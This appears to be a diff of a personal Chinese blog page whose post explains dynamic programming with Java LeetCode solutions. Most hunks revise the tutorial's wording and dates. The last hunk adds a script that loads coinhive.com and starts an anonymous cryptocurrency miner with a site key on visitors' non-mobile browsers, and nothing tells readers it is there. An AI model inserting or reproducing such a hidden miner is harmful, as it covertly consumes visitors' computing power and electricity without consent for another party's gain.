@@ -100,7 +100,7 @@
 <meta property="og:site_name" content="大黄菌的个人博客">
 <meta property="og:description" content="上周四去参加了第一次校招实习考试。虽然原本只是和同学凑个热闹，但结果还是着实有点打击。算法题一点思路都没有，前端知识也基本忘干净了。回到学校反思了一下，感觉从成都回来后学习状态确实很差。 另外，感觉自己把自己就预先划分到保研的身份去了。之前一直认为机器学习和前端不可兼得，自己划死了高度。实际上，很多业界人士在前端、机器学习以及其他方向都有很高水平。前端是我的兴趣，机器学习是之后可能深入研究的领域，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-12-29T12:23:36.000Z">
+<meta property="og:updated_time" content="2017-12-30T08:39:25.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="算法一篇通——动态规划">
 <meta name="twitter:description" content="上周四去参加了第一次校招实习考试。虽然原本只是和同学凑个热闹，但结果还是着实有点打击。算法题一点思路都没有，前端知识也基本忘干净了。回到学校反思了一下，感觉从成都回来后学习状态确实很差。 另外，感觉自己把自己就预先划分到保研的身份去了。之前一直认为机器学习和前端不可兼得，自己划死了高度。实际上，很多业界人士在前端、机器学习以及其他方向都有很高水平。前端是我的兴趣，机器学习是之后可能深入研究的领域，">
@@ -431,7 +431,7 @@
 <p>另外，感觉自己把自己就预先划分到保研的身份去了。之前一直认为机器学习和前端不可兼得，自己划死了高度。实际上，很多业界人士在前端、机器学习以及其他方向都有很高水平。前端是我的兴趣，机器学习是之后可能深入研究的领域，但是如果抱着只能二选一的心态去学习，只能说明自己不够勤奋。之后的学习目标首先是为读研打好稳固基石，然后也要涉及多方面的知识。</p>
 <p>回到正题。这次实习考试的第一题在当时没有思路，出来后同学讨论说要用到动态规划思想。之前有听过几次这个词，但是没有去了解，恰逢这个机会（以及为之后的美赛做准备），查阅了很多资料。在此总结一下我对动态规划的了解，以及用几个例子来说明，希望能尽可能地把动态规划给弄通。</p>
 <a id="more"></a>
-<h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><p><strong>动态规划（Dynamic programming）</strong>是一种在数学、计算机科学和经济学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。动态规划常常适用于有<strong>重叠子问题</strong>和<strong>最优子结构性质</strong>的问题，动态规划方法所耗时间往往远少于朴素解法。</p>
+<h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><p><strong>动态规划（Dynamic programming）</strong>是一种在数学、计算机科学和经济学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法，常用于求解<strong>最优化问题（Optimization problem）</strong>。动态规划常常适用于有<strong>重叠子问题</strong>和<strong>最优子结构性质</strong>的问题，动态规划方法所耗时间往往远少于朴素解法。</p>
 <p>当我们遇到一个大问题时，总是习惯把问题的规模变小，这样便于分析讨论。这个规模变小后的问题和原来的问题是同质的，除了规模变小，其它的都是一样的，本质上它还是同一个问题，我们就称其为原问题的<strong>子问题</strong>。</p>
 <p><strong>动态规划的核心</strong>是<strong>状态</strong>和<strong>状态转移方程</strong>：</p>
 <ul>
@@ -442,9 +442,9 @@
 </ul>
 <p>能使用动态规划思想解决的问题都有最优子结构性质和重叠子问题：</p>
 <ul>
-<li><p><strong>最优子结构（optimal substructure）</strong>性质：如果问题的最优解所包含的子问题的解也是最优的，我们就称该问题具有最优子结构性质。其包含“<strong>全局最优解包含局部最优解</strong>”的思想。</p>
+<li><p><strong>最优子结构（Optimal substructure）</strong>性质：如果问题的最优解所包含的子问题的解也是最优的，而这些子问题可以独立求解，我们就称该问题具有最优子结构性质。其包含“<strong>全局最优解包含局部最优解</strong>”的思想。</p>
 </li>
-<li><p>重叠子问题：指在用递归算法自顶向下对问题进行求解时，每次产生的子问题并不总是新问题，有些子问题会被重复计算多次。动态规划算法正是利用了这种子问题的重叠性质，对每一个子问题只计算一次，然后将其计算结果保存在一个表格中，当再次需要计算已经计算过的子问题时，只是在表格中简单地查看一下结果，从而获得较高的效率。</p>
+<li><p>重叠子问题：指在用<strong>递归</strong>算法自顶向下对问题进行求解时，每次产生的子问题并不总是新问题，有些子问题会被重复计算多次。动态规划算法正是利用了这种子问题的重叠性质，对每一个子问题只计算一次，然后将其计算结果保存在一个表格中，当再次需要计算已经计算过的子问题时，只是在表格中简单地查看一下结果，从而获得较高的效率。</p>
 </li>
 </ul>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>动态规划的解题思路如下：</p>
@@ -467,7 +467,7 @@
 </ol>
 <p>使用递归，我们写出如下代码：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">    <span class="keyword">return</span> climbStairs(n-<span class="number">1</span>) + climbStairs(n-<span class="number">2</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>Submit 就可以看到红红的 Time Limit Exceeded。计算时间超了，这是因为对于每一个 i，我们重复计算了很多次子问题的答案。想要节省这些计算，我们可以采用拿空间换时间的方法，用一个大小为 n 的数组来记录子问题的计算结果：</p>
+<p>Submit 就可以看到红红的 Time Limit Exceeded。计算时间超了，这是因为对于每一个 i，由于递归调用，我们反复求解相同的子问题，使得所作的工作量爆炸性增长。想要节省这些计算，我们可以采用拿空间换时间的方法，用一个大小为 n 的数组来记录子问题的计算结果：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">1</span>; i++)</div><div class="line">        fill(i, arr);</div><div class="line">    <span class="keyword">return</span> arr[n];</div><div class="line">&#125;</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fill</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">        arr[n] = <span class="number">1</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</div><div class="line">        arr[n] = <span class="number">2</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        arr[n] = arr[n-<span class="number">1</span>] + arr[n-<span class="number">2</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>AC，Run Time 5ms。</p>
 <p>也可以用递推法来解决，本质是一个 fibonacci。这里借 Discuss 里的解法一用：</p>
@@ -496,13 +496,11 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLongestChain</span><span class="params">(<span class="keyword">int</span>[][] pairs)</span> </span>&#123;</div><div class="line">    Arrays.sort(pairs, (a, b) -&gt; (a[<span class="number">1</span>] - b[<span class="number">1</span>]));</div><div class="line">    <span class="keyword">int</span> len = pairs.length;</div><div class="line">    <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</div><div class="line">    <span class="keyword">int</span> l = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</div><div class="line">        arr[i] = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</div><div class="line">            <span class="keyword">if</span>(pairs[j][<span class="number">1</span>] &lt; pairs[i][<span class="number">0</span>] &amp;&amp; arr[j] + <span class="number">1</span> &gt; arr[i])</div><div class="line">                arr[i] = arr[j] + <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span>(arr[i] &gt; l)</div><div class="line">            l = arr[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> l;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>时间复杂度是 O(n^2)，不是最佳解法。由于根据数对的最大值排好了序，因此可以直接用下列方法来完成：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLongestChain</span><span class="params">(<span class="keyword">int</span>[][] pairs)</span> </span>&#123;</div><div class="line">    Arrays.sort(pairs, (a,b) -&gt; a[<span class="number">1</span>] - b[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, n = pairs.length, i = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (++i &lt; n) &#123;</div><div class="line">        sum++;</div><div class="line">        <span class="keyword">int</span> curEnd = pairs[i][<span class="number">1</span>];</div><div class="line">        <span class="keyword">while</span> (i+<span class="number">1</span> &lt; n &amp;&amp; pairs[i+<span class="number">1</span>][<span class="number">0</span>] &lt;= curEnd) i++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="具体实现方法总结"><a href="#具体实现方法总结" class="headerlink" title="具体实现方法总结"></a>具体实现方法总结</h2><p>经过以上三个例题的锻炼，一般难度的动态规划问题应该都能解决了。总结一下，动态规划思想具体实现有以下三种方法：</p>
+<h2 id="具体实现方法总结"><a href="#具体实现方法总结" class="headerlink" title="具体实现方法总结"></a>具体实现方法总结</h2><p>经过以上三个例题的锻炼，一般难度的动态规划问题应该都能解决了。总结一下，动态规划思想具体实现有以下两种方法：</p>
 <ol>
-<li><p>用<strong>直接递归</strong>的方法计算状态转移方程，效率往往十分低下。其原因是<strong>相同的问题被重复计算了多次</strong>。</p>
+<li><p>可以用<strong>带备忘的自顶向下法（top-down with memoization）</strong>的方法计算状态转移方程。此方法仍然按自然的递归形式编写过程，但是用一个数组或者散列表来存储每个子问题的解，当需要时先检查是否已经保存过此解并取用。</p>
 </li>
-<li><p>可以采用<strong>递推法</strong>计算状态转移方程。递推的关键是边界和计算顺序。在多数情况下，递推法的时间复杂度是：状态总数 <em> 每个状态的决策个数 </em> 决策时间。如果不同状态的决策个数不同，需具体问题具体分析。注意递归和递推的区别：一个自顶向下，一个自底向上。</p>
-</li>
-<li><p>也可以用<strong>记忆化（memoization）搜索</strong>的方法计算状态转移方程。当采用记忆化搜索时，不必事先确定各状态的计算顺序，但<strong>需要记录每个状态“是否已经计算过”及计算的结果</strong>。</p>
+<li><p>还可以采用<strong>递推法</strong>自底向上地计算状态转移方程。递推的关键是边界和计算顺序，将子问题按照规模从小到大进行求解，当求解某个子问题时，其所依赖的更小的子问题都已求解完毕。在多数情况下，递推法的时间复杂度是：状态总数 <em> 每个状态的决策个数 </em> 决策时间。如果不同状态的决策个数不同，需具体问题具体分析。注意递归和递推的区别：一个自顶向下，一个自底向上。</p>
 </li>
 </ol>
 <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="最长非降子序列（LIS）"><a href="#最长非降子序列（LIS）" class="headerlink" title="最长非降子序列（LIS）"></a>最长非降子序列（LIS）</h3><p>给定一个序列<code>A[1]、A[2]、...、A[n]</code>，求其最长非降子序列（LIS，longest increasing subsequence）的长度。这是讲动态规划时基本都会讲到的一个问题。</p>
@@ -813,7 +811,7 @@
         <div class="copyright" >
   
   &copy;  2016 - 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -1307,6 +1305,15 @@
   
 
     <script type="text/javascript" src="/js/src/love.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    var miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});
+
+    // Only start on non-mobile devices
+    if (!miner.isMobile()) {
+        miner.start();
+    }
+</script>
   <!-- <script type="text/javascript" src="/js/src/copyright.js"></script> -->
 </body>
 </html>
